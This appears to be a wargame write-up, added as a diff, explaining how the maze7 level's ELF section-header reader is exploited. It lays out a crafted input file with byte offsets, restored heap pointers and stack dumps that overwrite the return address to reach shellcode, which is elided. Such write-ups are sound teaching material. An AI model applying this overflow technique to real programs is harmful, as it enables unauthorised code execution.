@@ -1,0 +1,176 @@
+Very peculiar and tricky level!
+
+The executable basically reads out the elf section headers for a binary file that you pass in as argv[1].
+
+It does this using a couple strange lseeks/reads/mallocs, and then a final loop that prints out the relevant information.
+
+This is done using a custom function named 'Print_Shdrs'... lets take a look and break down what it does.
+
+First of all - the maze7 binary only gets to this function if a valid (and readable) file is passed into argv[1].
+
+If so, it reads in some bytes from the file passed in, using those as the arguments for Print_Shdrs
+
+The arguments of this function do a couple of different things:
+- Argument one is the file descriptor
+- Argument two determines how far the first lseek goes
+- Argument three sets an offset to the data that determines how large the 2nd malloc is
+- Argument four determines the size of the first malloc (arg4*0x28) AND the number of 
+  loops to run at the end block
+- Argument five very importantly determines how many bytes are read into 'buf' in the last block
+
+These arguments are loaded in from the file at these locations from the file: 
+dword @ 0x20-0x23 = arg2 
+word @ 0x32 & 0x33 = arg3
+word @ 0x30 & 0x31 = arg4
+word @ 0x2e & 0x2f = arg5
+
+                      maze7->Print_Shdrs
+┌────────────────────────────────────────────────────────────────┐
+│                        malloc block                            │
+│          ┌───────────────────────────────────────────┐         │
+│          │lseek(arg1, arg2, 0)                       │         │
+│          │void* m1 = malloc(arg4 * 0x28)             │         │
+│          │read(arg1, m1, arg4 * 0x28)                │         │
+│          │void* m1_p_arg3 = m1 + arg3 * 0x28         │         │
+│          │lseek(arg1, *(m1_p_arg3 + 0x10), 0)        │         │
+│          │int m2 = malloc(*(m1_p_arg3 + 0x14))       │         │
+│          │read(arg1, m2, *(m1_p_arg3 + 0x14))        │         │
+│          │lseek(arg1, arg2, 0)                       │         │
+│          │puts("\nNo  Name\t\tAddress\t\tSize")      │         │
+│          │int counter = 0                            │         │
+│          └───────────────────────────────────────────┘         │
+│                              v                                 │
+│                              │                                 │
+│ ┌───────────────────────────────┐                              │
+│ │                            │  │                              │
+│ │                  ┌───────────────────────┐                   │
+│ │                  │while (counter <= arg4)│                   │
+│ │                  └───────────────────────┘                   │
+│ │                         t f                                  │
+│ │                         │ │                                  │
+│ │                   ┌─────┘ └───────────────────────┐          │
+│ │    printf block   │                               │ ret      │
+│ │  ┌───────────────────────────────────────┐ ┌────────────────┐│
+│ │  │char *buf                              │ │putchar('\n')   ││
+│ │  │read(arg1, buf, arg5)                  │ │free(m2)        ││
+│ │  │printf("%2d: %-16s\t...", counter,...) │ │return free(m1) ││
+│ │  └───────────────────────────────────────┘ └────────────────┘│
+│ │      v                                                       │
+│ │      │                                                       │
+│ └──────┘                                                       │
+└────────────────────────────────────────────────────────────────┘
+
+Although pretty confusing at first, with a bit of time and work it gets cleared up.
+
+First, the file (which I'll call 'public' from now on) gets lseek'd.
+This is done using arg2, and establishes the offset from which it'll read bytes now.
+
+Next, it creates a data buffer using malloc the size of (arg4*52).
+Then, it reads in data to this new malloc'd buffer, filling it.
+
+Let's forge the start of a file with this information in mind:
+
+                         public (v1):
+┌───────────────────────────────────────────────────────┐
+│AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x34\x00\x00ARGUMENT5>05 │
+│\x01\x00\x00\x00\x00\x00\x00\x00TRASH DATAAAAAAAAAAA   │
+└───────────────────────────────────────────────────────┘
+
+The 2nd argument gets loaded in as 0x34... meaning that the file's 1st and last lseek
+will place the file pointer 52 bytes into 'public'.
+
+Argument 3 is loaded in as 0. This will keep the size of the 2nd malloc predictable (it'll be the data in the first malloc's buffer + 16)
+
+Argument 4 is loaded in as 0x1, which makes the first malloc the size of 40 bytes (0x1*0x28)...
+but more importantly that makes sure that only ONE read is performed in the final block. (although
+we can overwrite the counter value to whatever we want later... :P)
+
+Lastly, argument five is loaded in as 0x3530 (ascii for '05'). Honestly irrelevant as it can be as large we want, it'll only write as many bytes as we provide in the file.
+
+With this version of 'public', the 'malloc' block will:
+- lseek to 54 bytes in
+- malloc a buffer of 40 bytes
+- read 40 bytes into this buffer, starting 54 bytes in
+
+Now if we were to check the content of the malloc buffer, it'd contain 'TRASH DATAAAAAAAAAAA'!
+
+                         public (v2):
+┌───────────────────────────────────────────────────────┐
+│AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x34\x00\x00ARGUMENT5>05 │
+│\x01\x00\x00\x00\x00\x00\x00\x00SEEKBYTES>>>\x5c\x00   │
+│\x00\x00\xff\xff\x00\x00<<<<2ndmallosize               │
+└───────────────────────────────────────────────────────┘
+
+Now, for the next few instructions...
+
+Argument 3 (0) is multiplied by 0x28, then added to the pointer to the first malloc buffer.
+Then 16 is added to this value, and dereferenced to determine the following lseek's size.
+
+Inside of our file, I decided to make this value 0x5c, which 92 bytes into the file.
+Next, another malloc buffer is performed - this time dereferencing the first malloc buffer
+plus 20 bytes.
+This dereferenced value determines the size of 2nd malloc buffer.
+THEN that buffer is filled with more data from 'public'.
+I chose the value 0xffff for the size of this malloc buffer.
+
+                         public (final):
+┌───────────────────────────────────────────────────────┐
+│AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x34\x00\x00ARGUMENT5>05 │
+│\x01\x00\x00\x00\x00\x00\x00\x00SEEKBYTES>>>\x5c\x00   │
+│\x00\x00\xff\xff\x00\x00<<<<2ndmallosize\x0a\xe0\xa5   │
+│\x04\x08pwnd\xb0\xa5\x04\x08\x00\x00\x00\x00AAAAAAAA   │
+│\x1f\xde\xff\xff\x0aIIIIIreads\x00\x00\x00\x00SHELLC   │
+│ODE=.....................................              │
+└───────────────────────────────────────────────────────┘
+
+With our two buffers filled, it goes to the final 'print' block.
+
+This block contains a small buffer on the stack, and data is read in from 'public' into
+the buffer. Fortunately for us, we can control the amount of data read using arg5 - 
+which allows us to overwrite the return address and take control of the prog.
+
+Unfortunately -- we also have to make it out of the loop, successfully pass through printf,
+and pass through the two free's with valid malloc addresses in order to do so.
+
+Lastly, we have to ensure we overwrite the return address by reading in the right amount of bytes
+and putting the new return address in the right location in our file.
+
+I left arg5 as the ascii value for '05', which is 0x3530 - more than enough bytes to overwrite the return address.
+
+When those bytes are read in, it removes both of the malloc addresses from the stack.
+
+This is bad for us - because the printf inside of the loop attempts to print strings from the 2nd malloc
+buffer, so we have to ensure we replace the malloc locations in the stack.
+
+On top of that, malloc buffers one AND two are freed outside of the loop, so replacing
+the first is important too (invalid malloc pointer would cause a SIGABORT).
+
+Those values locally ended up being 0x0804a5b0 (malloc 1) and 0x0804a5e0 (malloc 2).
+
+Lastly, we overwrite the counter if we're not being careful, causing the printf loop to go
+far too long - so I replaced those with null bytes. After the first run, it'll set that
+variable to 0 causing the loop to only run once. 
+
+Now the return address gets overwritten! Pointing it to the shellcode that was also written in nets a shell!
+
+Hexdump of stack before read: 
+         malloc 2 buffer address ┐                     ┌ malloc 1 buffer address
+0xffffdd68  0x00000003 0xffffdd74│0x00003530 0xf7ffcfe0│ ....t...05......
+0xffffdd78  0x00000000 0x00000000│0x00000002 0xffffdda4│ ................
+0xffffdd88  0xffffde08 0xf7dfc179│0xffffde08 0xf7fdcf5f│ ....y......._...
+0xffffdd98  0x00000000 0x0804a5e0┘0x0804a5b0 0x0804a5b0┘ ................
+0xffffdda8  0x00000000 0x00000034 0xffffde08 0x0804877f  ....4...........
+                                                └ return address to overwrite
+Hexdump of stack after read:
+
+  same-> malloc 2 buffer address ┐                     ┌ malloc 1 buffer address <-same
+0xffffdd68  0x00000003 0xffffdd74│0x00003530 0x00000000│ ....t...05......
+0xffffdd78  0x4b454553 0x45545942│0x3e3e3e53 0x0000005c│ SEEKBYTES>>>\...
+0xffffdd88  0x0000ffff 0x323c3c3c│0x616d646e 0x736f6c6c│ ....<<<2ndmallos
+0xffffdd98  0x0a657a69 0x0804a5e0┘0x646e7770 0x0804a5b0┘ ize.....pwnd....
+0xffffdda8  0x00000000 0x41414141 0x41414141 0xffffde1f  ....AAAAAAAA....
+                                                └ points to shellcode,
+						a little further down stack
+
+Cool and very unique level!
+
